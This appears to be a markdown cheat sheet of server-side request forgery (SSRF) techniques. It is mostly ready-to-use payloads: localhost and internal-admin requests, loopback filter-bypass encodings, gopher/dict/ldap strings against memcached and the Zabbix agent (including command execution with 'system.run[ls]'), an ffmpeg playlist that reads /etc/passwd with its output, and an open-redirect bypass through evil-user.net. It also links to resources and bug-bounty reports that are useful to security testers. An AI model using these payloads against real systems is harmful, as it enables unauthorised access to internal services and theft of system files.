## SSRF


Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

##### impact 

A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.


##### example 

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
-----
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin

------


#### SSRF with blacklist-based input filters

Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:

Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
Obfuscating blocked strings using URL encoding or case variation.

#### Bypass

http://google.com:80+&@127.88.23.245:22/#+@google.com:80/

http://127.88.23.245:22/+&@google.com:80#+@google.com:80/

http://google.com:80+&@google.com:80#+@127.88.23.245:22/

http://127.88.23.245:22/?@google.com:80/

http://127.88.23.245:22/#@www.google.com:80/

After testing several SSRF techniques I found a bypass for this protection.
Using an IPV6 vector [::].

http://hacker.site/x.php/?u=http://%5B::%5D:22/
0
127.00.1
127.0.01
0.00.0
0.0.00
127.1.0.1
127.10.1
127.1.01
0177.1
0177.0001.0001
0x0.0x0.0x0.0x0
0000.0000.0000.0000
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
0177.0001.0000..0001
0x7f.0x1.0x0.0x1
0x7f.0x1.0x1
localtest.me

 ##### Decimal/Hex/Octal formats of 192.168.0.10
    ##########################################

    #Decimal

    #8-bit  192.168.0.10
    #16-bit 192.168.10
    #24-bit 192.11010058
    #32-bit 3232235530

    #Octal

    #8-bit  0300.0250.00.012
    #16-bit 0300.0250.012
    #24-bit 0300.052000012
    #32-bit 030052000012

    #Hexadecimal

    #8-bit  0xc0.0xa8.0x0.0xa
    #16-bit 0xc0.0xa8.0xa
    #24-bit 0xc0.0xa8000a
    #32-bit 0xc0a8000a

##### Unsafe redirect

Easy way to bypass input validation is URL redirection. HTTP clients not a browsers. There are normally to do unsafe redirect
(except of Java case).

<?php
header(“Location: gopher://localhost:123/1asd”);
?>

Works fine for cURL, LWP, ASP.NET (exploit: http://anyhostwithredirest.com/ ­> gopher://localhost:11211/1stats%0aquit).


##### Protocol fingerprinting

POST / HTTP/1.1
Host: localhost
Content­-Length: 5

Server will wait last 5 bytes of request and socket still opened. Exploit:

gopher://localhost:8001/1POST%20%2fHTTP%2f1.1%0d%0aHost:localhost%0d%0aContent­Length:5%0d%0a%0d%0a





Exploits
gopher://localhost:11211/1%0astats%0aquit
dict://locahost:11211/stats
ldap://localhost:11211/%0astats%0aquit

gopher://localhost:10050/1vfs.file.regexp[/etc/hosts,7]
Server response:
ZBXD?127.0.0.1 localhost ads.localhost localhost.vv asd.localhost.vv
gopher://localhost:10050/1system.run[ls]
Server response:
ZBXD,usr
etc
var
boot

[src] (https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367)

$ cat video.mp4
&#EXTM3U
&#EXT­X­MEDIA­SEQUENCE:0
&#EXTINF:10.0,
concat:http://example.org/header.y4m|file:///etc/passwd
&EXT­X­ENDLIST
$ ffmpeg ­i video.mp4 thumbnail.png
$ ffmpeg ­i thumbnail.png out.y4m
$ cat out.y4m
YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono
FRAME
&# $FreeBSD: release/10.0.0/etc/master.passwd 256366
,! 2013­10­12 06:08:18Z rpaulo $
&#
root:*:0:0:Charlie &:/root:/usr/local/bin/zsh
toor:*:0:0:Bourne­again Superuser:/root:

##### Bypassing SSRF filters via open redirection


/product/nextProduct?currentProductId=6&path=http://evil-user.net

returns a redirection to:

http://evil-user.net

You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin

#### Protocols SSRF smuggling


Apache web­server HTTP parser

In despite of RFC 2616, Apache web­server allow single LF splitter instead of CRLF. Attacker can use this feature to smuggling
packets with 0x0d byte filtered.

Example:
GET / HTTP/1.1\nHost:localhost\n\n

Pay attention, that Apache Tomcat hasn’t same feature, only CRLF and LFCR are possible there.

---------

Nginx web­server HTTP parser

Nginx also supports splitters without CR byte (0x0d). This bytes listed below: 0x20, 0x30­0x39.

Example:
GET / HTTP/1.1\s\nHost:localhost\s\n\s\n

Also possible using 0x30­0x39 instead of 0x20 (\s)
Look at simple HTTP splitter fuzzer: https://github.com/ONsec­Lab/scripts/blob/master/http­splitter­fuzzer.php

There are number of vulnerabilities which can provide SSRF attacks. Basically they can be determined by this groups:

● Format processing
    ○ XML
■ XXE
■ DTD remote access
■ XML design
    ○ OpenOffice
■ DDE formulas
■ Dynamic data linking
■ External resource embedding
    ○ PDF (TCPDF)
● Direct sockets access
    ○ CRLF injection
● Net library URL processing (unsafe server­side redirect and others)
    ○ cURL
    ○ LWP
    ○ ASP.NET URI
    ○ Java URI
● External data linking
    ○ Databases
■ Postgres




##### Resources

https://portswigger.net/web-security/ssrf
https://github.com/cujanovic/SSRF-Testing
https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/
https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/SSRFbible%20Cheatsheet.pdf ++

##### Reports 

https://hackerone.com/reports/514224
https://hackerone.com/reports/643622
https://hackerone.com/reports/386292
https://hackerone.com/reports/517461
https://hackerone.com/reports/326040
https://hackerone.com/reports/392859 [like a tutorial :D]
https://hackerone.com/reports/508459
https://hackerone.com/reports/446593
https://hackerone.com/reports/398799
https://hackerone.com/reports/358119
https://hackerone.com/reports/341876
https://hackerone.com/reports/406387
https://hackerone.com/reports/406387
https://hackerone.com/reports/382048
https://hackerone.com/reports/305978
https://hackerone.com/reports/409701
https://hackerone.com/reports/299130
https://hackerone.com/reports/382612
https://hackerone.com/reports/293847